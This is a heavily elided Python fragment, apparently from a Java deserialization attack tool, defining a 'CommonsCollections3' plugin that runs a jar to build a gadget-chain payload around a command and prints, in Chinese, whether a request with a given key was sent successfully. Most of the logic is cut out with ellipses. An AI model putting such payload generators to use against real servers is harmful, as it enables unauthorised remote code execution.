...
@Idea.plugin_register('Class4:CommonsCollections3')
class CommonsCollections3(object):
    ...
    def generator(self, String, fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections3', command],       #popen
        ...
        try:
            ...
            if(r.status_code==200):
                print("[+]   CommonsCollections3模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
            else:
                print("[-]   CommonsCollections3模块   key: {} 发送异常！\n[-]   状态码:{}".format(str(key),str(r.status_code)))
